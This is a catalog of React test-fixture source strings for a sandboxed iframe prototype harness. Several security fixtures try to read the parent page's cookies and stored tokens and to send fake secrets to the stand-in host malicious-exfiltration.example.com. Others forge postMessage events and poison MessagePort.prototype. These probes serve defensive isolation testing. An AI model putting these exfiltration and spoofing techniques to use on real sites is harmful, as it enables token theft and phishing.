/**
 * Prototype Sandbox Fixture Catalog:
 * Raw source strings of test fixtures for both dev UI and automated tests.
 */

export const COUNTER_FIXTURE_CODE = `import React, { useState } from 'react';

export default function CounterFixture() {
  const [count, setCount] = useState(0);

  return (
    <div className="p-6 max-w-sm mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-xl font-bold text-gray-900" data-testid="counter-title">
        Interactive Counter
      </h2>
      <p className="text-sm text-gray-500">
        Tests React state transitions inside the sandboxed iframe.
      </p>
      <div className="flex items-center space-x-4">
        <span
          data-testid="counter-value"
          className="text-3xl font-extrabold text-blue-600 w-16 text-center"
        >
          {count}
        </span>
        <button
          data-testid="increment-btn"
          onClick={() => setCount((prev) => prev + 1)}
          className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-sm transition"
        >
          Increment
        </button>
        <button
          data-testid="reset-btn"
          onClick={() => setCount(0)}
          className="px-3 py-2 bg-gray-200 hover:bg-gray-300 text-gray-700 rounded-lg text-sm transition"
        >
          Reset
        </button>
      </div>
    </div>
  );
}
`;

export const VALVE_INSPECTION_FIXTURE_CODE = `import React, { useState } from 'react';

export default function ValveInspectionFixture() {
  const [pressure, setPressure] = useState('650');
  const [status, setStatus] = useState('DRAFT');
  const [isSubmitted, setIsSubmitted] = useState(false);

  const numPressure = parseFloat(pressure);
  const isValidNumber = !isNaN(numPressure);
  const isOutOfRange = isValidNumber && (numPressure < 450.0 || numPressure > 850.0);
  const isSafe = isValidNumber && !isOutOfRange;

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isSafe) {
      setStatus('SUBMITTED');
      setIsSubmitted(true);
    }
  };

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <div className="flex items-center justify-between border-b pb-3">
        <div>
          <h2 className="text-lg font-bold text-gray-900" data-testid="form-title">
            Valve Inspection & Pressure Check
          </h2>
          <span className="text-xs text-gray-400 font-mono">INT-004 / WS-OPS-001</span>
        </div>
        <span
          data-testid="status-badge"
          className={\`text-xs px-2.5 py-1 rounded-full font-semibold \${
            status === 'SUBMITTED'
              ? 'bg-green-100 text-green-700'
              : 'bg-gray-100 text-gray-700'
          }\`}
        >
          {status}
        </span>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label
            htmlFor="pressure-input"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            Valve Pressure (PSI)
          </label>
          <input
            id="pressure-input"
            data-testid="pressure-input"
            type="number"
            step="0.1"
            value={pressure}
            onChange={(e) => {
              setPressure(e.target.value);
              setIsSubmitted(false);
            }}
            className={\`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-2 \${
              isOutOfRange
                ? 'border-red-500 focus:ring-red-500 bg-red-50'
                : 'border-gray-300 focus:ring-blue-500'
            }\`}
          />
          <p className="mt-1 text-xs text-gray-500">
            Mandatory operating range: 450.0 - 850.0 PSI
          </p>
        </div>

        {isOutOfRange && (
          <div
            data-testid="validation-warning"
            className="p-3 bg-red-50 border border-red-300 rounded-md text-red-700 text-xs flex items-center gap-2"
          >
            <span className="font-bold">CRITICAL:</span>
            <span>
              Valve pressure {numPressure} PSI is outside safe operating range (450.0 - 850.0 PSI).
            </span>
          </div>
        )}

        {isSafe && (
          <div
            data-testid="validation-success"
            className="p-3 bg-green-50 border border-green-300 rounded-md text-green-700 text-xs flex items-center gap-2"
          >
            <span className="font-bold">NORMAL:</span>
            <span>Valve pressure is within safe operating parameters.</span>
          </div>
        )}

        {isSubmitted && (
          <div
            data-testid="submit-confirmation"
            className="p-3 bg-blue-50 border border-blue-300 rounded-md text-blue-700 text-xs"
          >
            Inspection report successfully submitted to field operations log.
          </div>
        )}

        <button
          type="submit"
          data-testid="submit-btn"
          disabled={!isSafe}
          onClick={handleSubmit}
          className="w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-medium rounded-md shadow transition"
        >
          Submit Inspection Record
        </button>
      </form>
    </div>
  );
}
`;

export const COMPILE_ERROR_FIXTURE_CODE = `import React from 'react';

// Intentional malformed JSX syntax error: unclosed tag
export default function BrokenSyntaxFixture() {
  return (
    <div className="p-4 bg-red-100">
      <span className="font-bold">Unclosed span tag
    </div>
  );
}
`;

export const RUNTIME_ERROR_FIXTURE_CODE = `import React from 'react';

// Intentional runtime render exception
export default function RuntimeErrorFixture() {
  throw new Error('Synthetic render failure inside sandboxed prototype component.');
  return <div>Will never render</div>;
}
`;

export const INFINITE_LOOP_FIXTURE_CODE = `import React from 'react';

// Intentional synchronous infinite loop: compiler inserts elapsed check which terminates it after 1000ms
export default function InfiniteLoopFixture() {
  while (true) {
    // Loop terminates via AST compiler guard after 1000ms
  }
  return <div>Unreachable loop content</div>;
}
`;

export const ASYNC_HANG_FIXTURE_CODE = `import React from 'react';

// Intentional async hang: suspends indefinitely without boundary, triggering host timeout and iframe recreation
export default function AsyncHangFixture() {
  throw new Promise(() => {});
  return <div>Hanging component</div>;
}
`;

export const SECURITY_DOM_ESCAPE_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityDomEscapeFixture() {
  const [probeResult, setProbeResult] = useState('Testing...');
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    try {
      const parentDoc = window.parent.document;
      setProbeResult('SECURITY BREACH: Accessed parent document: ' + parentDoc.title);
      setIsBlocked(false);
    } catch (err) {
      setProbeResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsBlocked(true);
    }
  }, []);

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="security-title">
        Parent DOM Boundary Probe
      </h2>
      <p className="text-sm text-gray-600">
        Attempts to access <code>window.parent.document</code>.
      </p>

      <div
        data-testid="dom-probe-result"
        className={\`p-3 rounded-md border text-xs font-mono whitespace-pre-wrap \${
          isBlocked
            ? 'bg-green-50 border-green-300 text-green-800'
            : 'bg-red-50 border-red-300 text-red-800'
        }\`}
      >
        {probeResult}
      </div>

      <div className="text-xs text-gray-500">
        Status: <span data-testid="dom-isolation-status" className="font-bold">{isBlocked ? 'BLOCKED' : 'BREACHED'}</span>
      </div>
    </div>
  );
}
`;

export const SECURITY_STORAGE_THEFT_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityStorageTheftFixture() {
  const [cookieResult, setCookieResult] = useState('Testing cookie...');
  const [localStorageResult, setLocalStorageResult] = useState('Testing localStorage...');
  const [sessionStorageResult, setSessionStorageResult] = useState('Testing sessionStorage...');
  const [isCookieBlocked, setIsCookieBlocked] = useState(false);
  const [isLocalStorageBlocked, setIsLocalStorageBlocked] = useState(false);
  const [isSessionStorageBlocked, setIsSessionStorageBlocked] = useState(false);

  useEffect(() => {
    // 1. Parent cookie
    try {
      const cookie = window.parent.document.cookie;
      setCookieResult('SECURITY BREACH: Read parent cookies: ' + cookie);
      setIsCookieBlocked(false);
    } catch (err) {
      setCookieResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsCookieBlocked(true);
    }

    // 2. Parent localStorage
    try {
      const parentStorage = window.parent.localStorage;
      const testItem = parentStorage.getItem('host-auth-token');
      setLocalStorageResult('SECURITY BREACH: Read parent localStorage: ' + testItem);
      setIsLocalStorageBlocked(false);
    } catch (err) {
      setLocalStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsLocalStorageBlocked(true);
    }

    // 3. Parent sessionStorage
    try {
      const parentSession = window.parent.sessionStorage;
      const secretItem = parentSession.getItem('host-session-secret');
      setSessionStorageResult('SECURITY BREACH: Read parent sessionStorage: ' + secretItem);
      setIsSessionStorageBlocked(false);
    } catch (err) {
      setSessionStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsSessionStorageBlocked(true);
    }
  }, []);

  const isFullyIsolated = isCookieBlocked && isLocalStorageBlocked && isSessionStorageBlocked;

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="storage-security-title">
        Host Storage & Cookie Theft Probe
      </h2>

      <div className="space-y-2">
        <div className="text-xs font-semibold text-gray-700">Cookie Access:</div>
        <div
          data-testid="cookie-probe-result"
          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
            isCookieBlocked
              ? 'bg-green-50 border-green-300 text-green-800'
              : 'bg-red-50 border-red-300 text-red-800'
          }\`}
        >
          {cookieResult}
        </div>
      </div>

      <div className="space-y-2">
        <div className="text-xs font-semibold text-gray-700">LocalStorage Access:</div>
        <div
          data-testid="storage-probe-result"
          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
            isLocalStorageBlocked
              ? 'bg-green-50 border-green-300 text-green-800'
              : 'bg-red-50 border-red-300 text-red-800'
          }\`}
        >
          {localStorageResult}
        </div>
      </div>

      <div className="space-y-2">
        <div className="text-xs font-semibold text-gray-700">SessionStorage Access:</div>
        <div
          data-testid="session-storage-probe-result"
          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
            isSessionStorageBlocked
              ? 'bg-green-50 border-green-300 text-green-800'
              : 'bg-red-50 border-red-300 text-red-800'
          }\`}
        >
          {sessionStorageResult}
        </div>
      </div>

      <div className="text-xs text-gray-500">
        Status: <span data-testid="storage-isolation-status" className="font-bold">
          {isFullyIsolated ? 'ISOLATED' : 'VULNERABLE'}
        </span>
      </div>
    </div>
  );
}
`;

export const SECURITY_NETWORK_EXFILTRATION_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityNetworkExfiltrationFixture() {
  const [probeResults, setProbeResults] = useState({
    fetchBlocked: null,
    xhrBlocked: null,
    beaconBlocked: null,
    imageBlocked: null,
    scriptBlocked: null,
    topNavBlocked: null,
  });

  useEffect(() => {
    // Listen for browser CSP security policy violations
    const handleViolation = (e) => {
      const uri = (e.blockedURI || '').toLowerCase();
      const dir = (e.violatedDirective || '').toLowerCase();
      if (uri.includes('beacon-leak') || dir.includes('connect-src')) {
        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
      }
      if (uri.includes('tracker.png') || dir.includes('img-src')) {
        setProbeResults((p) => ({ ...p, imageBlocked: true }));
      }
      if (uri.includes('remote-script') || dir.includes('script-src')) {
        setProbeResults((p) => ({ ...p, scriptBlocked: true }));
      }
    };

    document.addEventListener('securitypolicyviolation', handleViolation);

    // 1. fetch()
    fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
      method: 'POST',
      body: JSON.stringify({ leaked: 'secret-token' }),
    })
      .then(() => setProbeResults((p) => ({ ...p, fetchBlocked: false })))
      .catch(() => setProbeResults((p) => ({ ...p, fetchBlocked: true })));

    // 2. XMLHttpRequest
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://malicious-exfiltration.example.com/xhr-leak');
      xhr.onerror = () => setProbeResults((p) => ({ ...p, xhrBlocked: true }));
      xhr.onload = () => setProbeResults((p) => ({ ...p, xhrBlocked: false }));
      xhr.send('data=secret');
    } catch (_) {
      setProbeResults((p) => ({ ...p, xhrBlocked: true }));
    }

    // 3. navigator.sendBeacon
    try {
      if (typeof navigator.sendBeacon === 'function') {
        const sent = navigator.sendBeacon('https://malicious-exfiltration.example.com/beacon-leak', 'beacon=secret');
        if (!sent) {
          setProbeResults((p) => ({ ...p, beaconBlocked: true }));
        }
      } else {
        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
      }
    } catch (_) {
      setProbeResults((p) => ({ ...p, beaconBlocked: true }));
    }

    // 4. Remote Image load
    try {
      const img = new Image();
      img.onload = () => setProbeResults((p) => ({ ...p, imageBlocked: false }));
      img.onerror = () => setProbeResults((p) => ({ ...p, imageBlocked: true }));
      img.src = 'https://malicious-exfiltration.example.com/tracker.png?secret=123';
    } catch (_) {
      setProbeResults((p) => ({ ...p, imageBlocked: true }));
    }

    // 5. Remote Script Injection
    try {
      const script = document.createElement('script');
      script.onload = () => setProbeResults((p) => ({ ...p, scriptBlocked: false }));
      script.onerror = () => setProbeResults((p) => ({ ...p, scriptBlocked: true }));
      script.src = 'https://malicious-exfiltration.example.com/remote-script.js';
      document.head.appendChild(script);
    } catch (_) {
      setProbeResults((p) => ({ ...p, scriptBlocked: true }));
    }

    // 6. Top-level Navigation
    try {
      if (window.top && window.top !== window) {
        window.top.location.href = 'https://malicious-exfiltration.example.com/phish';
        setProbeResults((p) => ({ ...p, topNavBlocked: false }));
      } else {
        setProbeResults((p) => ({ ...p, topNavBlocked: true }));
      }
    } catch (err) {
      setProbeResults((p) => ({ ...p, topNavBlocked: true }));
    }
  }, []);

  const allResolved =
    probeResults.fetchBlocked !== null &&
    probeResults.xhrBlocked !== null &&
    probeResults.beaconBlocked !== null &&
    probeResults.imageBlocked !== null &&
    probeResults.scriptBlocked !== null &&
    probeResults.topNavBlocked !== null;

  const allBlocked =
    probeResults.fetchBlocked === true &&
    probeResults.xhrBlocked === true &&
    probeResults.beaconBlocked === true &&
    probeResults.imageBlocked === true &&
    probeResults.scriptBlocked === true &&
    probeResults.topNavBlocked === true;

  return (
    <div className="p-6 max-w-lg mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
        Multi-Vector Network & Navigation Exfiltration Probe
      </h2>

      <div className="space-y-2 text-xs font-mono">
        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>1. Outbound fetch() API:</span>
          <span data-testid="probe-fetch-status" className={probeResults.fetchBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.fetchBlocked === null ? 'PROBING...' : probeResults.fetchBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>2. XMLHttpRequest (XHR):</span>
          <span data-testid="probe-xhr-status" className={probeResults.xhrBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.xhrBlocked === null ? 'PROBING...' : probeResults.xhrBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>3. navigator.sendBeacon:</span>
          <span data-testid="probe-beacon-status" className={probeResults.beaconBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.beaconBlocked === null ? 'PROBING...' : probeResults.beaconBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>4. Remote Image (&lt;img src&gt;):</span>
          <span data-testid="probe-image-status" className={probeResults.imageBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.imageBlocked === null ? 'PROBING...' : probeResults.imageBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>5. Remote Script Injection:</span>
          <span data-testid="probe-script-status" className={probeResults.scriptBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.scriptBlocked === null ? 'PROBING...' : probeResults.scriptBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>6. Top-Level Navigation:</span>
          <span data-testid="probe-topnav-status" className={probeResults.topNavBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
            {probeResults.topNavBlocked === null ? 'PROBING...' : probeResults.topNavBlocked ? 'BLOCKED' : 'BREACHED'}
          </span>
        </div>
      </div>

      <div className="pt-2 border-t border-gray-200 flex items-center justify-between">
        <span className="text-xs font-semibold text-gray-700">Composite Exfiltration Boundary:</span>
        <span
          data-testid="network-isolation-status"
          className={\`px-2.5 py-1 rounded text-xs font-mono font-bold \${
            allResolved && allBlocked
              ? 'bg-green-100 text-green-800'
              : 'bg-yellow-100 text-yellow-800'
          }\`}
        >
          {!allResolved ? 'TESTING...' : allBlocked ? 'ALL_EXFILTRATION_BLOCKED' : 'VULNERABILITY_DETECTED'}
        </span>
      </div>
    </div>
  );
}
`;

export const SECURITY_MESSAGE_SPOOFING_FIXTURE_CODE = `import React, { useEffect, useState } from 'react';

export default function SecurityMessageSpoofingFixture() {
  const [tokensExposedCount, setTokensExposedCount] = useState(-1);
  const [spoofAttempted, setSpoofAttempted] = useState(false);

  useEffect(() => {
    // 1. Inspect all DOM script tags for leaked tokens
    const scripts = Array.from(document.querySelectorAll('script'));
    let exposedTokens = 0;
    for (const script of scripts) {
      const text = script.textContent || '';
      if (text.includes('HARNESS_TOKEN') || text.includes('sandboxToken') || /tok_[a-z0-9]+/i.test(text)) {
        exposedTokens++;
      }
    }
    setTokensExposedCount(exposedTokens);

    // 2. Deliberately attempt to spoof authoritative lifecycle events to window.parent
    try {
      window.parent.postMessage({
        source: 'solutions-studio-sandbox',
        version: 'solutions-studio-sandbox-v1',
        type: 'SANDBOX_RENDERED',
        renderTimeMs: 999999,
        executionId: 999,
      }, '*');

      window.parent.postMessage({
        source: 'solutions-studio-sandbox',
        version: 'solutions-studio-sandbox-v1',
        type: 'SANDBOX_RUNTIME_ERROR',
        executionId: 999,
        error: {
          message: 'FORGED_MALICIOUS_ERROR: Should be dropped by host',
        },
      }, '*');

      window.parent.postMessage({
        source: 'solutions-studio-sandbox',
        version: 'solutions-studio-sandbox-v1',
        type: 'SANDBOX_READY',
        executionId: 999,
      }, '*');

      setSpoofAttempted(true);
    } catch (_) {}
  }, []);

  return (
    <div
      className="p-4 bg-white border border-gray-200 rounded-lg shadow-sm"
      data-testid="spoof-probe-container"
    >
      <h2 className="text-sm font-bold text-gray-800 mb-2">
        Security Probe: Message Spoofing & Port Exclusivity
      </h2>
      <div className="space-y-1 text-xs">
        <p>
          Tokens exposed in script tags:{' '}
          <span className="font-mono font-bold" data-testid="spoof-tokens-found">
            {tokensExposedCount}
          </span>
        </p>
        <p>
          Spoof postMessages dispatched:{' '}
          <span className="font-mono font-bold text-blue-600" data-testid="spoof-attempted">
            {spoofAttempted ? 'true' : 'false'}
          </span>
        </p>
        <p
          className="mt-2 text-green-700 font-semibold"
          data-testid="spoof-probe-status"
        >
          {tokensExposedCount === 0 && spoofAttempted
            ? 'MessagePort security probe active: Zero tokens exposed, window spoof attempts dispatched'
            : 'Evaluating security probe...'}
        </p>
      </div>
    </div>
  );
}
`;

export const SECURITY_PROTOTYPE_POISONING_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

// Attempt to intercept privatePort and tamper with or observe lifecycle messages
// by poisoning MessagePort.prototype.postMessage.
try {
  const originalPostMessage = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function(...args) {
    const payload = args[0];
    // Intercept if the message is a sandbox lifecycle message (matching real protocol source 'solutions-studio-sandbox' or any SANDBOX_* lifecycle type)
    const isLifecycleTraffic =
      payload !== null &&
      typeof payload === 'object' &&
      (payload.source === 'solutions-studio-sandbox' ||
        (typeof payload.type === 'string' && payload.type.startsWith('SANDBOX_')));

    if (isLifecycleTraffic) {
      window.__capturedPortInstance = this;
      window.__capturedLifecyclePayload = payload;
      window.__interceptedLifecycleCalls = (window.__interceptedLifecycleCalls || 0) + 1;
    }
    window.__totalPostMessageCalls = (window.__totalPostMessageCalls || 0) + 1;

    // Forward non-lifecycle / scheduler calls so React DOM internal scheduler can execute
    return originalPostMessage.apply(this, args);
  };
} catch (_) {}

export default function SecurityPrototypePoisoningFixture() {
  const [interceptedCalls, setInterceptedCalls] = useState(0);
  const [capturedPortDetected, setCapturedPortDetected] = useState(false);

  useEffect(() => {
    // Re-check poisoned call counts after render lifecycle has concluded
    const timer = setTimeout(() => {
      setInterceptedCalls(window.__interceptedLifecycleCalls || 0);
      setCapturedPortDetected(!!window.__capturedPortInstance);
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div
      className="p-4 bg-white border border-gray-200 rounded-lg shadow-sm"
      data-testid="prototype-poisoning-probe"
    >
      <h2 className="text-sm font-bold text-gray-800 mb-2">
        Security Probe: Prototype Poisoning Defense
      </h2>
      <div className="space-y-1 text-xs">
        <p>
          Poisoning attempted:{' '}
          <span className="font-mono font-bold" data-testid="poisoning-attempted">
            true
          </span>
        </p>
        <p>
          Intercepted lifecycle calls via poisoned prototype:{' '}
          <span className="font-mono font-bold" data-testid="intercepted-calls-count">
            {interceptedCalls}
          </span>
        </p>
        <p>
          Captured privatePort reference:{' '}
          <span className="font-mono font-bold" data-testid="captured-port-detected">
            {capturedPortDetected ? 'true' : 'false'}
          </span>
        </p>
        <p
          className="mt-2 text-green-700 font-semibold"
          data-testid="poisoning-probe-status"
        >
          {interceptedCalls === 0 && !capturedPortDetected
            ? 'Prototype poisoning defeated: Harness uses bound native intrinsic; 0 intercepted calls'
            : 'VULNERABILITY DETECTED: MessagePort.prototype.postMessage intercepted privatePort'}
        </p>
      </div>
    </div>
  );
}
`;
